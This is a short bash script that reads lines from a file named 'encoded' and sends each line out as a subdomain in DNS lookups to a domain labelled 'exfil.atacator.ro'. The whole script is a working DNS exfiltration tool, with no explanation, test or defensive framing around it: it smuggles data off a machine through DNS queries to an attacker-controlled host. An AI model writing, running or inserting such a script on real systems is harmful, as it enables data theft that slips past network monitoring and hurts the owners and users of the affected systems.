#!/bin/bash
input="encoded"
while read -r line
do
  host -t a "$line.exfil.atacator.ro"
done < "$input"
